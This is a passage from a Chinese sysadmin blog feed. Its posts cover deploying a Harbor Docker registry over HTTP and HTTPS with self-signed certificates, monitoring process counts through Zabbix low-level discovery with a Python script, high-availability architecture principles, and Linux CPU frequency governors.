      <content type="html"><![CDATA[<h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><ul>
<li>Centos7.3 x64</li>
<li>docker-ce-17.06.0</li>
<li>docker-compose-1.15.0</li>
<li>Python-2.7.5(系统默认)</li>
</ul>
<h4 id="部署目标"><a href="#部署目标" class="headerlink" title="部署目标"></a>部署目标</h4><ul>
<li>使用HTTPS协议</li>
<li>支持Clair(在Harbor1.2版本会支持)</li>
</ul>
<h5 id="支持HTTPS"><a href="#支持HTTPS" class="headerlink" title="支持HTTPS"></a>支持HTTPS</h5><p>生产环境最好由权威CA机构签发证书(免费的推荐StartSSL,可参考<a href="https://www.wosign.com/Support/Nginx.html),这里为了测试方便使用自签发的证书" target="_blank" rel="external">https://www.wosign.com/Support/Nginx.html),这里为了测试方便使用自签发的证书</a></p>
<ul>
<li><p>创建CA证书</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl req  -newkey rsa:4096 -nodes -sha256 -keyout ca.key -x509 -days 365 -out ca.crt</div></pre></td></tr></table></figure>
</li>
<li><p>生成CSR公钥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl req  -newkey rsa:4096 -nodes -sha256 -keyout hub.wow.key  -out hub.wow.csr</div></pre></td></tr></table></figure>
</li>
<li><p>颁发证书</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl x509 -req -days 365 -in hub.wow.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out hub.wow.crt</div></pre></td></tr></table></figure>
</li>
<li><p>部署证书</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">cp hub.wow.crt hub.wow.key   /data/harbor/keys/</div><div class="line">vim /data/harbor/harbor.cfg</div><div class="line">  hostname = hub.wow</div><div class="line">  ui_url_protocol = https</div><div class="line">  ssl_cert = /data/harbor/keys/hub.wow.crt</div><div class="line">  ssl_cert_key = /data/harbor/keys/hub.wow.key</div><div class="line"></div><div class="line">    cd /data/harbor</div><div class="line">    ./prepare  重新生成配置文件</div><div class="line">    docker-compose down</div><div class="line">    docker-compose up</div></pre></td></tr></table></figure>
</li>
<li><p>通过HTTPS访问私有仓库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">WebUI: https://how.wow</div><div class="line">Docker Client:</div><div class="line"></div><div class="line">[root@hub ~]# docker login -u admin -p Harbor12345 hub.wow</div><div class="line">Login Succeeded</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>docker login时提示x509: certificate signed by unknown authority<br><strong>解决方法</strong>: 自签名的证书不被系统信任,需要cp ca.crt /etc/docker/certs.d/hub.wow/,  无需重启docker</p>
]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[企业级Docker私有仓库之Harbor部署(http)]]></title>
      <url>/2017/08/04/docker-harbor-http.html</url>
      <content type="html"><![CDATA[<h4 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h4><ul>
<li>Centos7.3 x64</li>
<li>docker-ce-17.06.0</li>
<li>docker-compose-1.15.0</li>
<li>Python-2.7.5(系统默认)</li>
</ul>
<h4 id="Docker及Docker-compose安装"><a href="#Docker及Docker-compose安装" class="headerlink" title="Docker及Docker-compose安装"></a>Docker及Docker-compose安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"> yum install -y yum-utils device-mapper-persistent-data lvm2</div><div class="line"> yum-config-manager \</div><div class="line">    --add-repo \</div><div class="line">    https://download.docker.com/linux/centos/docker-ce.repo</div><div class="line"> yum-config-manager --enable docker-ce-edge</div><div class="line"> yum makecache fast</div><div class="line"> systemctl start docker </div><div class="line"> systemctl enable docker</div><div class="line"></div><div class="line">curl -L https://github.com/docker/compose/releases/download/1.15.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose</div><div class="line">chmod +x /usr/local/bin/docker-compose</div></pre></td></tr></table></figure>
<h4 id="Habor部署配置"><a href="#Habor部署配置" class="headerlink" title="Habor部署配置"></a>Habor部署配置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">wget https://github.com/vmware/harbor/releases/download/v1.1.2/harbor-offline-installer-v1.1.2.tgz</div><div class="line">tar xf harbor-offline-installer-v1.1.2.tgz</div><div class="line">cd harbor/</div><div class="line"></div><div class="line">vim harbor.cfg</div><div class="line">hostname = hub.wow</div><div class="line">其他默认(http协议)</div><div class="line"></div><div class="line">./install.sh</div><div class="line">安装成功后，可以通过http://hub.wow/访问</div></pre></td></tr></table></figure>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2017/08/harborui.jpg" alt=""></p>
<h4 id="Docker客户端使用"><a href="#Docker客户端使用" class="headerlink" title="Docker客户端使用"></a>Docker客户端使用</h4><p>由于Harbor默认使用的http协议,故需要在Docker client上的Dockerd服务增加–insecure-registry hub.wow<br>Centos7修改方式为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">vim /lib/systemd/system/docker.service</div><div class="line">ExecStart=/usr/bin/dockerd  --insecure-registry hub.wow</div><div class="line"></div><div class="line">systemctl daemon-reload</div><div class="line">systemctl reload docker</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[root@localhost harbor]# docker login -u admin -p Harbor12345 hub.wow</div><div class="line">官方仓库下载busybox镜像</div><div class="line">[root@localhost harbor]# docker pull busybox </div><div class="line">[root@localhost harbor]# docker images</div><div class="line">REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">busybox                     latest              efe10ee6727f        2 weeks ago         1.13MB</div><div class="line">本地基于busybox:latest创建标记hub.wow/busybox:latest</div><div class="line">[root@localhost harbor]# docker tag busybox:latest hub.wow/project_name/busybox:latest</div><div class="line">推送本地镜像busybox:latest 到hub.wow私有仓库</div><div class="line">[root@localhost harbor]# docker push hub.wow/project_name/busybox:latest</div></pre></td></tr></table></figure>
<h4 id="Harbor服务管理"><a href="#Harbor服务管理" class="headerlink" title="Harbor服务管理"></a>Harbor服务管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd harbor/</div><div class="line">docker-compose -f ./docker-compose.yml  [ up|down|ps|stop|start ]</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> docker </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[使用Zabbix LLD实现进程数监控]]></title>
      <url>/2017/04/19/zabbix-proccess-lld.html</url>
      <content type="html"><![CDATA[<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><ul>
<li>针对特定进程数量做监控报警</li>
</ul>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>通过Zabbix LLD自动发现：每台机器都跑了什么服务、每个服务应该跑多少进程</li>
<li>Zabbix Agent 30s将当前机器跑了哪些服务、每个服务进程数上报Zabbix Server</li>
<li>开发给定配置文件proccessInfo.txt:  IP 服务名称 进程数量,此配置作为监控依据</li>
<li>proccessInfo.txt配置文件需在每次变更配置时，自动生成最新</li>
</ol>
<h4 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a>配置流程</h4><ol>
<li>LLD自动发现脚本</li>
<li>数据采集脚本</li>
<li>Agent添加Key</li>
<li>Zabbix Server添加模板组</li>
<li>创建自动发现规则(监控项、报警触发器)</li>
<li>添加当前进程数监控项(通过Zabbix Trapper方式，由Agent端)</li>
<li>定义报警内容</li>
</ol>
<h4 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h4><h4 id="LLD自动发现脚本"><a href="#LLD自动发现脚本" class="headerlink" title="LLD自动发现脚本"></a>LLD自动发现脚本</h4><p>LLD自动发现,将进程名称及进程总数上报Zabbix Server：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">/usr/bin/python services.py services_list</div><div class="line"></div><div class="line">&#123;</div><div class="line">    &quot;data&quot;: [</div><div class="line">        &#123;</div><div class="line">            &quot;&#123;#SERVICENAME&#125;&quot;: &quot;192.168.1.2-p_q1_server&quot;, </div><div class="line">            &quot;&#123;#TRIGGER_VALUE&#125;&quot;: 3</div><div class="line">        &#125;, </div><div class="line">        &#123;</div><div class="line">            &quot;&#123;#SERVICENAME&#125;&quot;: &quot;192.168.1.2-p_world_d2_server&quot;, </div><div class="line">            &quot;&#123;#TRIGGER_VALUE&#125;&quot;: 1</div><div class="line">        &#125;, </div><div class="line">        &#123;</div><div class="line">            &quot;&#123;#SERVICENAME&#125;&quot;: &quot;192.168.1.2-p_gate_server&quot;, </div><div class="line">            &quot;&#123;#TRIGGER_VALUE&#125;&quot;: 2</div><div class="line">        &#125;, </div><div class="line">        &#123;</div><div class="line">            &quot;&#123;#SERVICENAME&#125;&quot;: &quot;192.168.1.2-p_world_d1_server&quot;, </div><div class="line">            &quot;&#123;#TRIGGER_VALUE&#125;&quot;: 1</div><div class="line">        &#125;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">数据采集上报： /usr/bin/python services.py &#123;HOST.HOST&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line">import json</div><div class="line">import commands</div><div class="line">import subprocess</div><div class="line">import re</div><div class="line">import sys</div><div class="line"></div><div class="line">class services_monitor:</div><div class="line"></div><div class="line">        def __init__(self):</div><div class="line"></div><div class="line">            self.zabbix_server_ip = &apos;192.168.1.1&apos;</div><div class="line">            self.info_path = &apos;/home/proccessInfo.txt&apos;</div><div class="line">            self.data_path = &apos;/tmp/.process_number_monitor.log&apos;</div><div class="line"></div><div class="line">        def ip(self):</div><div class="line">            ipstr = &apos;([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&apos;</div><div class="line">            ipconfig_process = subprocess.Popen(&quot;ifconfig&quot;, stdout=subprocess.PIPE)</div><div class="line">            output = ipconfig_process.stdout.read()</div><div class="line">            ip_pattern = re.compile(&apos;(inet addr:%s)&apos; % ipstr)</div><div class="line">            pattern = re.compile(ipstr)</div><div class="line">            iplist = []</div><div class="line">            for ipaddr in re.finditer(ip_pattern, str(output)):</div><div class="line">                ip = pattern.search(ipaddr.group())</div><div class="line">                if ip.group() != &quot;127.0.0.1&quot;:</div><div class="line">                    iplist.append(ip.group())</div><div class="line">            ip = &apos;|&apos;.join(iplist)</div><div class="line">            return ip</div><div class="line"></div><div class="line">        def check_proc(self,proc_name):</div><div class="line"></div><div class="line">            cmd = &apos;ps -ef |grep  %s|grep -v grep|wc -l&apos; % proc_name</div><div class="line">            proccess_info = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)</div><div class="line"></div><div class="line">            # list=proccess_info.stdout.read().strip().split(&apos;\n&apos;)</div><div class="line">            procss_num = proccess_info.communicate()[0]</div><div class="line">            return procss_num</div><div class="line"></div><div class="line">        def get_info(self,ip):</div><div class="line"></div><div class="line">            service = []</div><div class="line">            status, result = commands.getstatusoutput(&quot;grep -E &apos;%s&apos; %s&quot; % (str(ip),self.info_path))</div><div class="line">            result = result.split(&apos;\n&apos;)</div><div class="line">            for i in result:</div><div class="line">                i = list(i.split(&apos; &apos;))</div><div class="line">                service.append(&#123;&quot;&#123;#SERVICENAME&#125;&quot;: i[0].strip() + &quot;-&quot; + i[1].strip(), &quot;&#123;#TRIGGER_VALUE&#125;&quot;:int(i[2].strip())&#125;)</div><div class="line">            data = json.dumps(&#123;&apos;data&apos;: service&#125;, sort_keys=True, indent=4)</div><div class="line">            return data</div><div class="line"></div><div class="line">        def collect_data(self,data):</div><div class="line">            data = json.loads(data)[&quot;data&quot;]</div><div class="line">            commands.getstatusoutput(&apos;cat /dev/null &amp;gt;%s&apos; % self.data_path)</div><div class="line">            f = open(self.data_path,&apos;a&apos;)</div><div class="line">            for i  in data:</div><div class="line">                name = i[&apos;&#123;#SERVICENAME&#125;&apos;].split(&apos;-&apos;)</div><div class="line">                ip = name[0]</div><div class="line">                proc_name =  name[1]</div><div class="line">                f.write(&apos;%s\tproc_num[%s]\t%s&apos; %(ip,i[&apos;&#123;#SERVICENAME&#125;&apos;],self.check_proc(proc_name)))</div><div class="line">            f.close()</div><div class="line"></div><div class="line">        def send_data(self,data_path):</div><div class="line">            status,output = commands.getstatusoutput(&apos;/bin/bash -c &quot;zabbix_sender -z  %s  -i  %s &amp;amp;&amp;gt;/dev/null&quot;&apos; % (self.zabbix_server_ip,self.data_path))</div><div class="line">            print status,output</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line"></div><div class="line">    services = services_monitor()</div><div class="line">    ip = services.ip()</div><div class="line">    data = services.get_info(ip)</div><div class="line">    try:</div><div class="line">        argv = sys.argv[1]</div><div class="line">        if argv == &quot;services_list&quot;:</div><div class="line">            print data</div><div class="line">        else:</div><div class="line">            services.collect_data(data)</div><div class="line">            services.send_data(services.data_path)</div><div class="line">    except IndexError:</div><div class="line">        print data</div></pre></td></tr></table></figure>
<h4 id="Agent添加Key"><a href="#Agent添加Key" class="headerlink" title="Agent添加Key"></a>Agent添加Key</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">vim /usr/local/etc/zabbix_agentd.conf</div><div class="line">UserParameter=dzpt.service.process.discovery,/usr/bin/python /home/opt/scripts/services.py services_list</div><div class="line">UserParameter=dzpt.service.process.exec[*],/usr/bin/python /home/opt/scripts/services.py  $1</div></pre></td></tr></table></figure>
<h4 id="创建自动发现规则"><a href="#创建自动发现规则" class="headerlink" title="创建自动发现规则"></a>创建自动发现规则</h4><p>(监控项Trapper方式、报警触发器)</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2017/04/rules.jpg" alt=""></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2017/04/roles-items.jpg" alt=""></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2017/04/roles-triggers.jpg" alt=""></p>
<h4 id="添加当前进程数监控项"><a href="#添加当前进程数监控项" class="headerlink" title="添加当前进程数监控项"></a>添加当前进程数监控项</h4><p><img src="http://ow1schdt5.bkt.clouddn.com/2017/04/process-stat.jpg" alt=""></p>
<h4 id="定义报警内容"><a href="#定义报警内容" class="headerlink" title="定义报警内容"></a>定义报警内容</h4><p>Action中定义(此处略)</p>
<h4 id="将定义好的模板链接到主机或者其他模板即可"><a href="#将定义好的模板链接到主机或者其他模板即可" class="headerlink" title="将定义好的模板链接到主机或者其他模板即可"></a>将定义好的模板链接到主机或者其他模板即可</h4><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>使用Zabbix LLD之后，可以设定多久更新一次监控项及监控阀值；当配置文件变更时，无需人为调整阀值和监控项</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[架构学习之路-高可用高并发系统设计原则]]></title>
      <url>/2017/04/13/arc-ha-summary.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>本系列博客主要是学习开涛《亿级流量网站架构核心技术》一书学习笔记及自己的感悟：</p>
</blockquote>
<h4 id="架构设计三大定律"><a href="#架构设计三大定律" class="headerlink" title="架构设计三大定律"></a>架构设计三大定律</h4><blockquote>
<p>墨菲定律</p>
<ul>
<li>任何事没有表面看起来那么简单</li>
<li>所有的事都会比预计的时间长</li>
<li>可能出错的事情总会出错</li>
<li><p>担心某种事情发生，那么它就更有可能发生</p>
<p>康威定律</p>
</li>
</ul>
</blockquote>
<ul>
<li>系统架构师公司组织架构的反映</li>
<li>按照业务闭环进行系统拆分/组织架构划分，实现闭环、高内聚、低耦合，减少沟通成本</li>
<li>如果沟通出现问题，应该考虑进行系统和组织架构的调整</li>
<li>适合时机进行系统拆分，不要一开始就吧系统、服务拆分拆的非常细，虽然闭环，但是每个人维护的系统多，维护成本高</li>
<li>微服务架构的理论基础 - 康威定律 <a href="https://yq.aliyun.com/articles/8611" target="_blank" rel="external">https://yq.aliyun.com/articles/8611</a></li>
<li>每个架构师都应该研究下康威定律 <a href="http://36kr.com/p/5042735.html" target="_blank" rel="external">http://36kr.com/p/5042735.html</a></li>
</ul>
<blockquote>
<p>二八定律</p>
</blockquote>
<ul>
<li>80%的结果取决于20%的原因</li>
</ul>
<h4 id="系统设计遵循的原则"><a href="#系统设计遵循的原则" class="headerlink" title="系统设计遵循的原则"></a>系统设计遵循的原则</h4><h5 id="1-高并发原则"><a href="#1-高并发原则" class="headerlink" title="1. 高并发原则"></a>1. 高并发原则</h5><blockquote>
<p>无状态</p>
</blockquote>
<ul>
<li>无状态应用，便于水平扩展</li>
<li>有状态配置可通过配置中心实现无状态</li>
<li>实践: Disconf、Yaconf、Zookpeer、Consul、Confd、Diamond、Xdiamond等</li>
</ul>
<blockquote>
<p>拆分</p>
</blockquote>
<ul>
<li>系统维度：按照系统功能、业务拆分，如购物车，结算，订单等</li>
<li>功能维度：对系统功能在做细粒度拆分</li>
<li>读写维度：根据读写比例特征拆分；读多，可考虑多级缓存；写多，可考虑分库分表</li>
<li>AOP维度： 根据访问特征，按照AOP进行拆分，比如商品详情页可分为CDN、页面渲染系统，CDN就是一个AOP系统</li>
<li>模块维度：对整体代码结构划分Web、Service、DAO</li>
</ul>
<blockquote>
<p>服务化</p>
</blockquote>
<ul>
<li>服务化演进: 进程内服务-单机远程服务-集群手动注册服务-自动注册和发现服务-服务的分组、隔离、路由-服务治理</li>
<li>考虑服务分组、隔离、限流、黑白名单、超时、重试机制、路由、故障补偿等</li>
<li>实践：利用Nginx、HaProxy、LVS等实现负载均衡，ZooKeeper、Consul等实现自动注册和发现服</li>
</ul>
<blockquote>
<p>消息队列</p>
</blockquote>
<ul>
<li>目的: 服务解耦(一对多消费)、异步处理、流量削峰缓冲等</li>
<li>大流量缓冲： 牺牲强一致性，保证最终一致性(案例：库存扣减，现在Redis中做扣减，记录扣减日志，通过后台进程将扣减日志应用到DB)</li>
<li>数据校对: 解决异步消息机制下消息丢失问题</li>
</ul>
<blockquote>
<p>数据异构</p>
</blockquote>
<ul>
<li>数据异构: 通过消息队列机制接收数据变更，原子化存储</li>
<li>数据闭环: 屏蔽多从数据来源，将数据异构存储，形成闭环</li>
</ul>
<blockquote>
<p>缓存银弹</p>
</blockquote>
<ul>
<li><p>用户层:</p>
<ul>
<li>DNS缓存</li>
<li>浏览器DNS缓存</li>
<li>操作系统DNS缓存</li>
<li>本地DNS服务商缓存</li>
<li>DNS服务器缓存</li>
<li>客户端缓存</li>
<li>浏览器缓存(Expires、Cache-Control、Last-Modified、Etag)*   App客户缓存(js/css/image…)</li>
</ul>
</li>
<li><p>代理层：</p>
<ul>
<li>CDN缓存(一般基于ATS、Varnish、Nginx、Squid等构建,边缘节点-二级节点-中心节点-源站)</li>
</ul>
</li>
<li><p>接入层：</p>
<ul>
<li><p>Nginx为例：</p>
</li>
<li><p>Proxy_cache： 代理缓存,可以存储到/dev/shm或者SSD</p>
</li>
<li>FastCGI Cache</li>
<li>Nginx+Lua+Redis: 业务数据缓存</li>
<li>PHP为例：<ul>
<li>Opcache： 缓存PHP的Opcodes</li>
</ul>
</li>
</ul>
</li>
<li><p>应用层：</p>
<ul>
<li>页面静态化</li>
<li>业务数据缓存(Redis/Memcached/本地文件等)</li>
<li>消息队列</li>
</ul>
</li>
<li><p>数据层：</p>
<ul>
<li>NoSQL： Redis、Memcache、SSDB等</li>
<li>MySQL： Innodb/MyISAM等Query Cache、Key Cache、Innodb Buffer Size等</li>
</ul>
</li>
<li><p>系统层：</p>
<ul>
<li>CPU : L1/L2/L3 Cache/NUMA</li>
<li>内存</li>
<li>磁盘：磁盘本身缓存、dirty_ratio/dirty_background_ratio、阵列卡本身缓存</li>
</ul>
</li>
</ul>
<blockquote>
<p>并发化</p>
</blockquote>
<h5 id="2-高可用原则"><a href="#2-高可用原则" class="headerlink" title="2. 高可用原则"></a>2. 高可用原则</h5><blockquote>
<p>降级</p>
</blockquote>
<ul>
<li>降级开关集中化管理：将开关配置信息推送到各个应用</li>
<li>可降级的多级读服务：如服务调用降级为只读本地缓存</li>
<li>开关前置化：如Nginx+lua(OpenResty)配置降级策略，引流流量；可基于此做灰度策略</li>
<li>业务降级：高并发下，保证核心功能，次要功能可由同步改为异步策略或屏蔽功能</li>
</ul>
<blockquote>
<p>限流</p>
</blockquote>
<ul>
<li>目的: 防止恶意请求攻击或超出系统峰值</li>
<li><p>实践：</p>
<ul>
<li>恶意请求流量只访问到Cache</li>
<li>穿透后端应用的流量使用Nginx的limit处理</li>
<li>恶意IP使用Nginx Deny策略或者iptables拒绝</li>
</ul>
</li>
</ul>
<blockquote>
<p>切流量</p>
</blockquote>
<ul>
<li>目的：屏蔽故障机器</li>
<li><p>实践:</p>
<ul>
<li>DNS: 更改域名解析入口，如DNSPOD可以添加备用IP，正常IP故障时，会自主切换到备用地址;生效实践较慢</li>
<li>HttpDNS: 为了绕过运营商LocalDNS实现的精准流量调度</li>
<li>LVS/HaProxy/Nginx: 摘除故障节点</li>
</ul>
</li>
</ul>
<blockquote>
<p>可回滚</p>
</blockquote>
<ul>
<li>发布版本失败时可随时快速回退到上一个稳定版本</li>
</ul>
<h5 id="3-业务设计原则"><a href="#3-业务设计原则" class="headerlink" title="3. 业务设计原则"></a>3. 业务设计原则</h5><ul>
<li>防重设计</li>
<li>幂等设计</li>
<li>流程定义</li>
<li>状态与状态机</li>
<li>后台系统操作可反馈</li>
<li>后台系统审批化</li>
<li>文档注释</li>
<li>备份</li>
</ul>
<h5 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h5><p>先行规划和设计时有必要的，要对现有问题有方案，对未来有预案;欠下的技术债，迟早都是要还的。</p>
]]></content>
      
        <categories>
            
            <category> 架构之路 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[CPU工作模式及调频]]></title>
      <url>/2017/03/24/cpu-model-freq.html</url>
      <content type="html"><![CDATA[<h4 id="安装i7z及cpufrequtils"><a href="#安装i7z及cpufrequtils" class="headerlink" title="安装i7z及cpufrequtils"></a>安装i7z及cpufrequtils</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install i7z cpufrequtils</div></pre></td></tr></table></figure>
<h4 id="常见的CPU工作模式"><a href="#常见的CPU工作模式" class="headerlink" title="常见的CPU工作模式"></a>常见的CPU工作模式</h4><table>
<thead>
<tr>
<th style="text-align:left">调速器</th>
<th style="text-align:right">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">ondemand</td>
<td style="text-align:right">按需快速动态调整CPU频率， 一有cpu计算量的任务，就会立即达到最大频率运行，等执行完毕就立即回到最低频率（阙值为 95%</td>
</tr>
<tr>
<td style="text-align:left">performance</td>
<td style="text-align:right">运行于最大频率</td>
</tr>
<tr>
<td style="text-align:left">conservative</td>
<td style="text-align:right">按需快速动态调整CPU频率， 一有cpu计算量的任务，就会立即达到最大频率运行，等执行完毕就立即回到最低频率（阙值为 75%）</td>
</tr>
<tr>
<td style="text-align:left">powersave</td>
<td style="text-align:right">运行于最小频率</td>
</tr>
<tr>
<td style="text-align:left">userspace</td>
<td style="text-align:right">运行于用户指定的频率</td>
</tr>
</tbody>
</table>
<h4 id="查看当前CPU工作模式"><a href="#查看当前CPU工作模式" class="headerlink" title="查看当前CPU工作模式"></a>查看当前CPU工作模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">查看CPU当前的工作模式</div><div class="line">cat /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor</div><div class="line"></div><div class="line">查看支持的CPU工作模式</div><div class="line">cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_available_governors</div></pre></td></tr></table></figure>
<p>由于在Debian 8下默认使用intel_pstate驱动,只支持performance和powersave模式,不同频率驱动程序支持的模式不同<br>具体可以参考：CPU frequency scaling  <a href="http://t.cn/R6cQXvp" target="_blank" rel="external">http://t.cn/R6cQXvp</a></p>
<h4 id="调整最高性能模式"><a href="#调整最高性能模式" class="headerlink" title="调整最高性能模式"></a>调整最高性能模式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo &apos;performance&apos; |tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor</div></pre></td></tr></table></figure>
<h4 id="CPU调频"><a href="#CPU调频" class="headerlink" title="CPU调频"></a>CPU调频</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Usage: cpufreq-set [options] Options:</div><div class="line">-c CPU, --cpu CPU       #指定CPU核心号，请注意上图的analyzing CPU数字。</div><div class="line">-d FREQ, --min FREQ     #手工指定最小主频速度。（在userspace策略）</div><div class="line">-u FREQ, --max FREQ     #手工指定最大主频速度。（在userspace策略）</div><div class="line">-g GOV, --governor GOV  #设置工作策略</div><div class="line">-f FREQ, --freq FREQ    #设定特定的工作频率（CPU默认档次）</div><div class="line">#请参考上图的available frequency steps</div><div class="line">-h, --help            #输出这个帮助信息</div><div class="line"></div><div class="line">cpufreq-set  -d 2.4Ghz -u 2.4Ghz</div></pre></td></tr></table></figure>
<h4 id="实时查看频率"><a href="#实时查看频率" class="headerlink" title="实时查看频率"></a>实时查看频率</h4><p>通过i7z命令可实时查看当前CPU的工作频率</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx/Haproxy作为反向代理或负载均衡时如何获取客户真实IP？]]></title>
      <url>/2017/03/01/haproxy-proxy-ip.html</url>
